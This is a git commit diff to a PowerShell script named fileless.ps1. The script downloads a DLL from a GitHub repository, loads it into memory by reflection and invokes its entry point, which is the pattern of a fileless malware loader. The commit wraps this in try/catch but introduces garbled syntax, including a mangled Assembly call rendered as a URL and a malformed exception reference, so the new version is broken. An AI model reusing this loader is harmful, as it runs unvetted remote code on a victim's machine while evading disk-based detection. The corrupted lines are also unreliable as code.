909d3fa48e83d000ff1db3f54e2f2194755eb112
imreallyemo1337 <134841320+imreallyemo1337@users.noreply.github.com>
2023-10-15 13:39:32 +0700

    Update fileless.ps1

--- fileless.ps1
+++ fileless.ps1
@@ -1,16 +1,21 @@
 $dllUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll"
 
 # Download the DLL to a byte array
-$fileData = (New-Object System.Net.WebClient).DownloadData($dllUrl)
+try {
+    # Download the DLL to a byte array
+    $fileData = (New-Object System.Net.WebClient).DownloadData($dllUrl)
 
-# Load the assembly into memory
-$assembly = [System.Reflection.Assembly]::Load($fileData)
+    # Load the assembly into memory
+    $assembly = System.Reflection.Assembly (http://ystem.reflection.assemblyy/)::Load($fileData)
 
-# Get the main entry point (i.e., main method) of the assembly
-$entryPoint = $assembly.EntryPoint
+    # Get the main entry point (i.e., main method) of the assembly
+    $entryPoint = $assembly.EntryPoint
 
-# Invoke the main method
-if ($entryPoint -ne $null) {
-    $entryPoint.Invoke($null, @())
+    # Invoke the main method
+    if ($entryPoint -ne $null) {
+        $entryPoint.Invoke($null, @())
+    }
+} catch {
+    # Print error message if the DLL fails to load
+    Write-Host "Failed to load the DLL: $($.Exception.Message)"
 }
-
